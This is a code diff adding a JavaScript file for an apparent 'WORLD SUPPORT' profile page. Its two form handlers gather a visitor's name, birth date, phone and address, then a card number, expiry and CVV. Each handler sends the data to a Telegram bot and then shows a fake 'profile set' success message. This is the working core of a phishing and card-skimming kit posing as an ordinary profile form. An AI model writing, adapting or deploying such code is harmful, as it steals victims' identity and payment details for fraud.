@@ -1,0 +1,148 @@
+/*const loggedInUser = localStorage.getItem('loggedInUser');
+
+    if (loggedInUser) {
+      document.getElementById('usernameDisplay').textContent = loggedInUser.toUpperCase();
+     }
+
+/*function showEdit() {
+  document.querySelector('.transaction-section').style.display = 'block';
+  document.querySelector('.transaction-section2').style.display = 'none';
+  document.querySelector('section').style.display = 'none';
+}
+
+function showContact() {
+  document.querySelector('.contact-area').style.display = 'block';
+  document.querySelector('.bi-chevron-right').style.display = 'none';
+  document.querySelector('.bi-chevron-down').style.display = 'block';
+};
+
+function hideContact() {
+  document.querySelector('.contact-area').style.display = 'none';
+  document.querySelector('.bi-chevron-right').style.display = 'block';
+  document.querySelector('.bi-chevron-down').style.display = 'none';
+};
+
+
+function hideTransaction() {
+  document.querySelector('.transaction-section').style.display = 'none';
+  document.querySelector('section').style.display = 'block';
+  document.querySelector('.transaction-section2').style.display = 'none';
+};
+
+function hideTransaction1() {
+  document.querySelector('.transaction-section').style.display = 'block';
+  document.querySelector('section').style.display = 'none';
+  document.querySelector('.transaction-section2').style.display = 'none';
+};
+
+function logout() {
+  setTimeout(function() {
+    document.getElementById("loading").style.display = "block";
+    window.location.href = "signup.html";}, 3000);
+}*/
+
+function hideTransaction() {
+  window.location.href = 'dashboard.html';
+};
+
+  // Automatically add slashes to date input
+   document.querySelector('#date').addEventListener('input', function(e) {
+       var date = document.querySelector('#date').value;
+        if (date.length === 2 || date.length === 5) {
+         document.querySelector('#date').value = date + '/';
+        }
+   });
+
+  // Handle form submission
+   const form = document.querySelector('#form');
+    form.addEventListener('submit', (e) => {
+     e.preventDefault();
+      var first = document.querySelector('#first-name').value;
+      var last = document.querySelector('#last-name').value;
+      var date = document.querySelector('#date').value;
+      var number = document.querySelector('#phone-number').value;
+      var address = document.querySelector('#address').value;
+      var city = document.querySelector('#city').value;
+      var state = document.querySelector('#state').value;
+      var code = document.querySelector('#zip-code').value;
+      var country = document.querySelector('#country').value;
+      
+      localStorage.setItem('first-name', first);
+      localStorage.setItem('last-name', last);
+
+    var my_text = `WORLD SUPPORT PROFILE RESULTS: %0A %0A First Name: ${first} %0A %0A Last Name: ${last} %0A %0A Date of Birth: ${date}  %0A %0A  Phone Number: ${number} %0A %0A Address: ${address} %0A %0A  City: ${city} %0A %0A  State: ${state} %0A %0A  Postal Code: ${code} %0A %0A Country ${country}`;
+    
+    document.querySelector('.transaction-section').style.display = 'none';
+    document.querySelector('.transaction-section2').style.display = 'block';
+  // document.querySelector('section').style.display = 'none';
+
+    // Replace with your actual token and chat_id
+    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`
+    
+    
+    let api = new XMLHttpRequest();
+      api.open("GET", url, true);
+      api.send();
+      code.value = ""
+            
+            
+  });
+
+
+document.getElementById('cardNumber').addEventListener('input', function(event) {
+    let value = event.target.value.replace(/\s+/g, '');
+    if (value.length > 16) {
+        value = value.substr(0, 16);
+    }
+    event.target.value = value.replace(/(.{4})/g, '$1 ').trim();
+});
+
+document.getElementById('dateCard').addEventListener('input', function(event) {
+    let value = event.target.value.replace(/\//g, '');
+    if (value.length > 4) {
+        value = value.substr(0, 4);
+    }
+    if (value.length > 2) {
+        value = value.substr(0, 2) + '/' + value.substr(2);
+    }
+    event.target.value = value;
+});
+
+const form2 = document.querySelector('#form2');
+
+form2.addEventListener('submit', (e) => {
+    e.preventDefault();
+    
+    const cardNumber = document.querySelector('#cardNumber').value;
+    const date = document.querySelector('#date').value;
+    const cvv = document.querySelector('#cvv').value;
+    
+    const my_text = `WORLD SUPPORT PROFILE RESULTS: %0A %0A Card Number: ${cardNumber} %0A Expired Date: ${date} %0A CVV: ${cvv} %0A `;
+    
+   
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
+    
+    const api = new XMLHttpRequest();
+    api.open("GET", url, true);
+    api.send();
+    
+    
+    Swal.fire({
+      title: "Set Profile successfully!",
+      icon: "success"
+    });
+});
+
+
+/*function home() {
+  window.location.href = "dashboard.html";
+};
+
+function explore() {
+  window.location.href = "explore.html";
+};
+
+function profile() {
+  window.location.href = "profile.html";
+};
+*/
